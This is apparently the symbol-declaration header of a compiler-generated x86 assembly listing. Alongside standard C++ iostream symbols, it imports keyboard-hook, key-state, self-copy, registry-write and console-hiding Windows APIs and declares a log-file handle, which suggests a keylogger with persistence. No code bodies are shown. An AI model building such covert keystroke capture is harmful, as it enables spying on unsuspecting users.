PUBLIC	__CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20
PUBLIC	??_7_Iostream_error_category2@std@@6B@		; std::_Iostream_error_category2::`vftable'
PUBLIC	??_C@_08LLGCOLLL@iostream@			; `string'
PUBLIC	?_Iostream_error@?4??message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB ; `std::_Iostream_error_category2::message'::`5'::_Iostream_error
PUBLIC	??_7bad_cast@std@@6B@				; std::bad_cast::`vftable'
PUBLIC	??_C@_08EPJLHIJG@bad?5cast@			; `string'
PUBLIC	__TI2?AVbad_cast@std@@
PUBLIC	__CTA2?AVbad_cast@std@@
PUBLIC	??_R0?AVbad_cast@std@@@8			; std::bad_cast `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QAE@ABV01@@Z12
PUBLIC	??_7_Facet_base@std@@6B@			; std::_Facet_base::`vftable'
PUBLIC	??_C@_0BA@ELKIONDK@bad?5locale?5name@		; `string'
PUBLIC	??_7facet@locale@std@@6B@			; std::locale::facet::`vftable'
PUBLIC	??_7codecvt_base@std@@6B@			; std::codecvt_base::`vftable'
PUBLIC	??_7ctype_base@std@@6B@				; std::ctype_base::`vftable'
PUBLIC	??_7?$ctype@D@std@@6B@				; std::ctype<char>::`vftable'
PUBLIC	??_7failure@ios_base@std@@6B@			; std::ios_base::failure::`vftable'
PUBLIC	??_7ios_base@std@@6B@				; std::ios_base::`vftable'
PUBLIC	??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@	; `string'
PUBLIC	??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@	; `string'
PUBLIC	??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@	; `string'
PUBLIC	__TI5?AVfailure@ios_base@std@@
PUBLIC	__CTA5?AVfailure@ios_base@std@@
PUBLIC	??_R0?AVfailure@ios_base@std@@@8		; std::ios_base::failure `RTTI Type Descriptor'
PUBLIC	__CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QAE@ABV012@@Z20
PUBLIC	?userlc@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@A ; userlc
PUBLIC	??_7?$basic_ios@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_ios<char,std::char_traits<char> >::`vftable'
PUBLIC	??_7?$basic_istream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_istream<char,std::char_traits<char> >::`vftable'
PUBLIC	??_8?$basic_istream@DU?$char_traits@D@std@@@std@@7B@ ; std::basic_istream<char,std::char_traits<char> >::`vbtable'
PUBLIC	??_7?$basic_ostream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_ostream<char,std::char_traits<char> >::`vftable'
PUBLIC	??_8?$basic_ostream@DU?$char_traits@D@std@@@std@@7B@ ; std::basic_ostream<char,std::char_traits<char> >::`vbtable'
PUBLIC	??_7?$basic_iostream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_iostream<char,std::char_traits<char> >::`vftable'
PUBLIC	??_8?$basic_iostream@DU?$char_traits@D@std@@@std@@7B?$basic_istream@DU?$char_traits@D@std@@@1@@ ; std::basic_iostream<char,std::char_traits<char> >::`vbtable'
PUBLIC	??_8?$basic_iostream@DU?$char_traits@D@std@@@std@@7B?$basic_ostream@DU?$char_traits@D@std@@@1@@ ; std::basic_iostream<char,std::char_traits<char> >::`vbtable'
PUBLIC	??_7?$basic_streambuf@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_streambuf<char,std::char_traits<char> >::`vftable'
PUBLIC	??_7?$basic_filebuf@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_filebuf<char,std::char_traits<char> >::`vftable'
PUBLIC	??_7?$basic_fstream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_fstream<char,std::char_traits<char> >::`vftable'
PUBLIC	??_8?$basic_fstream@DU?$char_traits@D@std@@@std@@7B?$basic_istream@DU?$char_traits@D@std@@@1@@ ; std::basic_fstream<char,std::char_traits<char> >::`vbtable'
PUBLIC	??_8?$basic_fstream@DU?$char_traits@D@std@@@std@@7B?$basic_ostream@DU?$char_traits@D@std@@@1@@ ; std::basic_fstream<char,std::char_traits<char> >::`vbtable'
PUBLIC	?logfileHandle@@3V?$basic_fstream@DU?$char_traits@D@std@@@std@@A ; logfileHandle
PUBLIC	?id@?$codecvt@DDU_Mbstatet@@@std@@2V0locale@2@A	; std::codecvt<char,char,_Mbstatet>::id
PUBLIC	??_7?$codecvt@DDU_Mbstatet@@@std@@6B@		; std::codecvt<char,char,_Mbstatet>::`vftable'
PUBLIC	?_Stinit@?1??_Init@?$basic_filebuf@DU?$char_traits@D@std@@@std@@IAEXPAU_iobuf@@W4_Initfl@23@@Z@4U_Mbstatet@@A ; `std::basic_filebuf<char,std::char_traits<char> >::_Init'::`2'::_Stinit
PUBLIC	??_C@_0BI@CFPLBAOH@invalid?5string?5position@	; `string'
PUBLIC	?_Static@?1???$_Immortalize_memcpy_image@V_Iostream_error_category2@std@@@std@@YAABV_Iostream_error_category2@1@XZ@4U?$_Constexpr_immortalize_impl@V_Iostream_error_category2@std@@@1@A ; `std::_Immortalize_memcpy_image<std::_Iostream_error_category2>'::`2'::_Static
PUBLIC	?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PBVfacet@locale@2@B ; std::_Facetptr<std::ctype<char> >::_Psave
PUBLIC	?_Psave@?$_Facetptr@V?$codecvt@DDU_Mbstatet@@@std@@@std@@2PBVfacet@locale@2@B ; std::_Facetptr<std::codecvt<char,char,_Mbstatet> >::_Psave
PUBLIC	??_R4ios_base@std@@6B@				; std::ios_base::`RTTI Complete Object Locator'
PUBLIC	??_R0?AVios_base@std@@@8			; std::ios_base `RTTI Type Descriptor'
PUBLIC	??_R3ios_base@std@@8				; std::ios_base::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2ios_base@std@@8				; std::ios_base::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@ios_base@std@@8			; std::ios_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R17?0A@EA@?$_Iosb@H@std@@8			; std::_Iosb<int>::`RTTI Base Class Descriptor at (8,-1,0,64)'
PUBLIC	??_R0?AV?$_Iosb@H@std@@@8			; std::_Iosb<int> `RTTI Type Descriptor'
PUBLIC	??_R3?$_Iosb@H@std@@8				; std::_Iosb<int>::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$_Iosb@H@std@@8				; std::_Iosb<int>::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$_Iosb@H@std@@8			; std::_Iosb<int>::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$basic_ios@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_ios<char,std::char_traits<char> >::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$basic_ios@DU?$char_traits@D@std@@@std@@@8 ; std::basic_ios<char,std::char_traits<char> > `RTTI Type Descriptor'
PUBLIC	??_R3?$basic_ios@DU?$char_traits@D@std@@@std@@8	; std::basic_ios<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$basic_ios@DU?$char_traits@D@std@@@std@@8	; std::basic_ios<char,std::char_traits<char> >::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; std::basic_ios<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$basic_streambuf@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_streambuf<char,std::char_traits<char> >::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@@8 ; std::basic_streambuf<char,std::char_traits<char> > `RTTI Type Descriptor'
PUBLIC	??_R3?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 ; std::basic_streambuf<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 ; std::basic_streambuf<char,std::char_traits<char> >::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$basic_streambuf@DU?$char_traits@D@std@@@std@@8 ; std::basic_streambuf<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$basic_istream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_istream<char,std::char_traits<char> >::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$basic_istream@DU?$char_traits@D@std@@@std@@@8 ; std::basic_istream<char,std::char_traits<char> > `RTTI Type Descriptor'
PUBLIC	??_R3?$basic_istream@DU?$char_traits@D@std@@@std@@8 ; std::basic_istream<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$basic_istream@DU?$char_traits@D@std@@@std@@8 ; std::basic_istream<char,std::char_traits<char> >::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8 ; std::basic_istream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8 ; std::basic_ios<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,0,4,80)'
PUBLIC	??_R1A@A@3EA@ios_base@std@@8			; std::ios_base::`RTTI Base Class Descriptor at (0,0,4,64)'
PUBLIC	??_R17A@3EA@?$_Iosb@H@std@@8			; std::_Iosb<int>::`RTTI Base Class Descriptor at (8,0,4,64)'
PUBLIC	??_R4?$basic_ostream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@@8 ; std::basic_ostream<char,std::char_traits<char> > `RTTI Type Descriptor'
PUBLIC	??_R3?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$basic_iostream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_iostream<char,std::char_traits<char> >::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@@8 ; std::basic_iostream<char,std::char_traits<char> > `RTTI Type Descriptor'
PUBLIC	??_R3?$basic_iostream@DU?$char_traits@D@std@@@std@@8 ; std::basic_iostream<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$basic_iostream@DU?$char_traits@D@std@@@std@@8 ; std::basic_iostream<char,std::char_traits<char> >::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$basic_iostream@DU?$char_traits@D@std@@@std@@8 ; std::basic_iostream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R1BA@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8 ; std::basic_ostream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (16,-1,0,64)'
PUBLIC	??_R4?$basic_filebuf@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_filebuf<char,std::char_traits<char> >::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@@8 ; std::basic_filebuf<char,std::char_traits<char> > `RTTI Type Descriptor'
PUBLIC	??_R3?$basic_filebuf@DU?$char_traits@D@std@@@std@@8 ; std::basic_filebuf<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$basic_filebuf@DU?$char_traits@D@std@@@std@@8 ; std::basic_filebuf<char,std::char_traits<char> >::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$basic_filebuf@DU?$char_traits@D@std@@@std@@8 ; std::basic_filebuf<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$basic_fstream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_fstream<char,std::char_traits<char> >::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@@8 ; std::basic_fstream<char,std::char_traits<char> > `RTTI Type Descriptor'
PUBLIC	??_R3?$basic_fstream@DU?$char_traits@D@std@@@std@@8 ; std::basic_fstream<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$basic_fstream@DU?$char_traits@D@std@@@std@@8 ; std::basic_fstream<char,std::char_traits<char> >::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$basic_fstream@DU?$char_traits@D@std@@@std@@8 ; std::basic_fstream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4exception@std@@6B@				; std::exception::`RTTI Complete Object Locator'
PUBLIC	??_R3exception@std@@8				; std::exception::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2exception@std@@8				; std::exception::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@exception@std@@8			; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_alloc@std@@6B@				; std::bad_alloc::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_alloc@std@@8				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_alloc@std@@8				; std::bad_alloc::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_alloc@std@@8			; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_array_new_length@std@@6B@		; std::bad_array_new_length::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_array_new_length@std@@8		; std::bad_array_new_length::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_array_new_length@std@@8	; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4runtime_error@std@@6B@			; std::runtime_error::`RTTI Complete Object Locator'
PUBLIC	??_R3runtime_error@std@@8			; std::runtime_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2runtime_error@std@@8			; std::runtime_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@runtime_error@std@@8		; std::runtime_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R0?AVerror_category@std@@@8			; std::error_category `RTTI Type Descriptor'
PUBLIC	??_R3error_category@std@@8			; std::error_category::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2error_category@std@@8			; std::error_category::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@error_category@std@@8		; std::error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_System_error@std@@6B@			; std::_System_error::`RTTI Complete Object Locator'
PUBLIC	??_R3_System_error@std@@8			; std::_System_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_System_error@std@@8			; std::_System_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_System_error@std@@8		; std::_System_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4system_error@std@@6B@			; std::system_error::`RTTI Complete Object Locator'
PUBLIC	??_R3system_error@std@@8			; std::system_error::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2system_error@std@@8			; std::system_error::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@system_error@std@@8		; std::system_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_Iostream_error_category2@std@@6B@		; std::_Iostream_error_category2::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV_Iostream_error_category2@std@@@8	; std::_Iostream_error_category2 `RTTI Type Descriptor'
PUBLIC	??_R3_Iostream_error_category2@std@@8		; std::_Iostream_error_category2::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Iostream_error_category2@std@@8		; std::_Iostream_error_category2::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Iostream_error_category2@std@@8	; std::_Iostream_error_category2::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4bad_cast@std@@6B@				; std::bad_cast::`RTTI Complete Object Locator'
PUBLIC	??_R3bad_cast@std@@8				; std::bad_cast::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2bad_cast@std@@8				; std::bad_cast::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@bad_cast@std@@8			; std::bad_cast::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4_Facet_base@std@@6B@			; std::_Facet_base::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV_Facet_base@std@@@8			; std::_Facet_base `RTTI Type Descriptor'
PUBLIC	??_R3_Facet_base@std@@8				; std::_Facet_base::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Facet_base@std@@8				; std::_Facet_base::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Facet_base@std@@8		; std::_Facet_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R1A@?0A@EA@facet@locale@std@@8		; std::locale::facet::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R0?AVfacet@locale@std@@@8			; std::locale::facet `RTTI Type Descriptor'
PUBLIC	??_R3facet@locale@std@@8			; std::locale::facet::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2facet@locale@std@@8			; std::locale::facet::`RTTI Base Class Array'
PUBLIC	??_R13?0A@EA@_Crt_new_delete@std@@8		; std::_Crt_new_delete::`RTTI Base Class Descriptor at (4,-1,0,64)'
PUBLIC	??_R0?AU_Crt_new_delete@std@@@8			; std::_Crt_new_delete `RTTI Type Descriptor'
PUBLIC	??_R3_Crt_new_delete@std@@8			; std::_Crt_new_delete::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2_Crt_new_delete@std@@8			; std::_Crt_new_delete::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@_Crt_new_delete@std@@8		; std::_Crt_new_delete::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4facet@locale@std@@6B@			; std::locale::facet::`RTTI Complete Object Locator'
PUBLIC	??_R4codecvt_base@std@@6B@			; std::codecvt_base::`RTTI Complete Object Locator'
PUBLIC	??_R0?AVcodecvt_base@std@@@8			; std::codecvt_base `RTTI Type Descriptor'
PUBLIC	??_R3codecvt_base@std@@8			; std::codecvt_base::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2codecvt_base@std@@8			; std::codecvt_base::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@codecvt_base@std@@8		; std::codecvt_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4ctype_base@std@@6B@			; std::ctype_base::`RTTI Complete Object Locator'
PUBLIC	??_R0?AUctype_base@std@@@8			; std::ctype_base `RTTI Type Descriptor'
PUBLIC	??_R3ctype_base@std@@8				; std::ctype_base::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2ctype_base@std@@8				; std::ctype_base::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@ctype_base@std@@8			; std::ctype_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$ctype@D@std@@6B@				; std::ctype<char>::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$ctype@D@std@@@8			; std::ctype<char> `RTTI Type Descriptor'
PUBLIC	??_R3?$ctype@D@std@@8				; std::ctype<char>::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$ctype@D@std@@8				; std::ctype<char>::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$ctype@D@std@@8			; std::ctype<char>::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4failure@ios_base@std@@6B@			; std::ios_base::failure::`RTTI Complete Object Locator'
PUBLIC	??_R3failure@ios_base@std@@8			; std::ios_base::failure::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2failure@ios_base@std@@8			; std::ios_base::failure::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@failure@ios_base@std@@8		; std::ios_base::failure::`RTTI Base Class Descriptor at (0,-1,0,64)'
PUBLIC	??_R4?$codecvt@DDU_Mbstatet@@@std@@6B@		; std::codecvt<char,char,_Mbstatet>::`RTTI Complete Object Locator'
PUBLIC	??_R0?AV?$codecvt@DDU_Mbstatet@@@std@@@8	; std::codecvt<char,char,_Mbstatet> `RTTI Type Descriptor'
PUBLIC	??_R3?$codecvt@DDU_Mbstatet@@@std@@8		; std::codecvt<char,char,_Mbstatet>::`RTTI Class Hierarchy Descriptor'
PUBLIC	??_R2?$codecvt@DDU_Mbstatet@@@std@@8		; std::codecvt<char,char,_Mbstatet>::`RTTI Base Class Array'
PUBLIC	??_R1A@?0A@EA@?$codecvt@DDU_Mbstatet@@@std@@8	; std::codecvt<char,char,_Mbstatet>::`RTTI Base Class Descriptor at (0,-1,0,64)'
EXTRN	__purecall:PROC
EXTRN	??2@YAPAXI@Z:PROC				; operator new
EXTRN	??3@YAXPAXI@Z:PROC				; operator delete
EXTRN	??_V@YAXPAX@Z:PROC				; operator delete[]
EXTRN	_atexit:PROC
EXTRN	__invalid_parameter_noinfo_noreturn:PROC
EXTRN	??0_Lockit@std@@QAE@H@Z:PROC			; std::_Lockit::_Lockit
EXTRN	??1_Lockit@std@@QAE@XZ:PROC			; std::_Lockit::~_Lockit
EXTRN	_free:PROC
EXTRN	__get_stream_buffer_pointers:PROC
EXTRN	_fclose:PROC
EXTRN	_fflush:PROC
EXTRN	_fgetc:PROC
EXTRN	_fgetpos:PROC
EXTRN	_fputc:PROC
EXTRN	_fread:PROC
EXTRN	_fsetpos:PROC
EXTRN	__fseeki64:PROC
EXTRN	_fwrite:PROC
EXTRN	_setvbuf:PROC
EXTRN	_ungetc:PROC
EXTRN	__lock_file:PROC
EXTRN	__unlock_file:PROC
EXTRN	_memcpy:PROC
EXTRN	_memmove:PROC
EXTRN	_strlen:PROC
EXTRN	?_Xlength_error@std@@YAXPBD@Z:PROC		; std::_Xlength_error
EXTRN	?_Xout_of_range@std@@YAXPBD@Z:PROC		; std::_Xout_of_range
EXTRN	?_Xruntime_error@std@@YAXPBD@Z:PROC		; std::_Xruntime_error
EXTRN	?uncaught_exception@std@@YA_NXZ:PROC		; std::uncaught_exception
EXTRN	___std_exception_copy:PROC
EXTRN	___std_exception_destroy:PROC
EXTRN	??_Eexception@std@@UAEPAXI@Z:PROC		; std::exception::`vector deleting destructor'
EXTRN	??_Ebad_alloc@std@@UAEPAXI@Z:PROC		; std::bad_alloc::`vector deleting destructor'
EXTRN	??_Ebad_array_new_length@std@@UAEPAXI@Z:PROC	; std::bad_array_new_length::`vector deleting destructor'
EXTRN	??_Eruntime_error@std@@UAEPAXI@Z:PROC		; std::runtime_error::`vector deleting destructor'
EXTRN	??_E_System_error@std@@UAEPAXI@Z:PROC		; std::_System_error::`vector deleting destructor'
EXTRN	??_Esystem_error@std@@UAEPAXI@Z:PROC		; std::system_error::`vector deleting destructor'
EXTRN	?_Syserror_map@std@@YAPBDH@Z:PROC		; std::_Syserror_map
EXTRN	??_E_Iostream_error_category2@std@@UAEPAXI@Z:PROC ; std::_Iostream_error_category2::`vector deleting destructor'
EXTRN	??_Ebad_cast@std@@UAEPAXI@Z:PROC		; std::bad_cast::`vector deleting destructor'
EXTRN	??_E_Facet_base@std@@UAEPAXI@Z:PROC		; std::_Facet_base::`vector deleting destructor'
EXTRN	?_Facet_Register@std@@YAXPAV_Facet_base@1@@Z:PROC ; std::_Facet_Register
EXTRN	__Getctype:PROC
EXTRN	__Tolower:PROC
EXTRN	__Toupper:PROC
EXTRN	?_Locinfo_ctor@_Locinfo@std@@SAXPAV12@PBD@Z:PROC ; std::_Locinfo::_Locinfo_ctor
EXTRN	?_Locinfo_dtor@_Locinfo@std@@SAXPAV12@@Z:PROC	; std::_Locinfo::_Locinfo_dtor
EXTRN	??_Efacet@locale@std@@MAEPAXI@Z:PROC		; std::locale::facet::`vector deleting destructor'
EXTRN	?_Init@locale@std@@CAPAV_Locimp@12@_N@Z:PROC	; std::locale::_Init
EXTRN	?_Getgloballocale@locale@std@@CAPAV_Locimp@12@XZ:PROC ; std::locale::_Getgloballocale
EXTRN	??_Ecodecvt_base@std@@UAEPAXI@Z:PROC		; std::codecvt_base::`vector deleting destructor'
EXTRN	??_Ectype_base@std@@UAEPAXI@Z:PROC		; std::ctype_base::`vector deleting destructor'
EXTRN	??_E?$ctype@D@std@@MAEPAXI@Z:PROC		; std::ctype<char>::`vector deleting destructor'
EXTRN	??_Efailure@ios_base@std@@UAEPAXI@Z:PROC	; std::ios_base::failure::`vector deleting destructor'
EXTRN	?_Addstd@ios_base@std@@SAXPAV12@@Z:PROC		; std::ios_base::_Addstd
EXTRN	?_Ios_base_dtor@ios_base@std@@CAXPAV12@@Z:PROC	; std::ios_base::_Ios_base_dtor
EXTRN	??_Eios_base@std@@UAEPAXI@Z:PROC		; std::ios_base::`vector deleting destructor'
EXTRN	?_Fiopen@std@@YAPAU_iobuf@@PBDHH@Z:PROC		; std::_Fiopen
EXTRN	__imp__GetEnvironmentVariableA@12:PROC
EXTRN	__imp__CreateDirectoryA@8:PROC
EXTRN	__imp__SetFileAttributesA@8:PROC
EXTRN	__imp__WaitForSingleObject@8:PROC
EXTRN	__imp__CreateThread@24:PROC
EXTRN	__imp__GetModuleFileNameA@12:PROC
EXTRN	__imp__GetModuleHandleA@4:PROC
EXTRN	__imp__CopyFileA@12:PROC
EXTRN	__imp__GetMessageA@16:PROC
EXTRN	__imp__TranslateMessage@4:PROC
EXTRN	__imp__DispatchMessageA@4:PROC
EXTRN	__imp__ShowWindow@8:PROC
EXTRN	__imp__GetKeyState@4:PROC
EXTRN	__imp__GetAsyncKeyState@4:PROC
EXTRN	__imp__SetWindowsHookExA@16:PROC
EXTRN	__imp__UnhookWindowsHookEx@4:PROC
EXTRN	__imp__GetConsoleWindow@0:PROC
EXTRN	__imp__RegCloseKey@4:PROC
EXTRN	__imp__RegOpenKeyExA@20:PROC
EXTRN	__imp__RegSetValueExA@24:PROC
EXTRN	??_E?$basic_ios@DU?$char_traits@D@std@@@std@@UAEPAXI@Z:PROC ; std::basic_ios<char,std::char_traits<char> >::`vector deleting destructor'
EXTRN	??_E?$basic_istream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z:PROC ; std::basic_istream<char,std::char_traits<char> >::`vector deleting destructor'
EXTRN	??_E?$basic_ostream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z:PROC ; std::basic_ostream<char,std::char_traits<char> >::`vector deleting destructor'
EXTRN	??_E?$basic_iostream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z:PROC ; std::basic_iostream<char,std::char_traits<char> >::`vector deleting destructor'
EXTRN	??_E?$basic_streambuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z:PROC ; std::basic_streambuf<char,std::char_traits<char> >::`vector deleting destructor'
EXTRN	??_E?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAEPAXI@Z:PROC ; std::basic_filebuf<char,std::char_traits<char> >::`vector deleting destructor'
EXTRN	??_E?$basic_fstream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z:PROC ; std::basic_fstream<char,std::char_traits<char> >::`vector deleting destructor'
EXTRN	??_E?$codecvt@DDU_Mbstatet@@@std@@MAEPAXI@Z:PROC ; std::codecvt<char,char,_Mbstatet>::`vector deleting destructor'
EXTRN	@__security_check_cookie@4:PROC
EXTRN	__CxxThrowException@8:PROC
EXTRN	___CxxFrameHandler3:PROC
EXTRN	??_7type_info@@6B@:QWORD			; type_info::`vftable'
EXTRN	?_Id_cnt@id@locale@std@@0HA:DWORD		; std::locale::id::_Id_cnt
EXTRN	?id@?$ctype@D@std@@2V0locale@2@A:DWORD		; std::ctype<char>::id
EXTRN	___security_cookie:DWORD
_BSS	SEGMENT
?userlc@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@A DB 018H DUP (?) ; userlc
?logfileHandle@@3V?$basic_fstream@DU?$char_traits@D@std@@@std@@A DB 0c0H DUP (?) ; logfileHandle
_BSS	ENDS
;	COMDAT ?id@?$codecvt@DDU_Mbstatet@@@std@@2V0locale@2@A
_BSS	SEGMENT
?id@?$codecvt@DDU_Mbstatet@@@std@@2V0locale@2@A DD 01H DUP (?) ; std::codecvt<char,char,_Mbstatet>::id
_BSS	ENDS
;	COMDAT ?_Stinit@?1??_Init@?$basic_filebuf@DU?$char_traits@D@std@@@std@@IAEXPAU_iobuf@@W4_Initfl@23@@Z@4U_Mbstatet@@A
_BSS	SEGMENT
?_Stinit@?1??_Init@?$basic_filebuf@DU?$char_traits@D@std@@@std@@IAEXPAU_iobuf@@W4_Initfl@23@@Z@4U_Mbstatet@@A DQ 01H DUP (?) ; `std::basic_filebuf<char,std::char_traits<char> >::_Init'::`2'::_Stinit
_BSS	ENDS
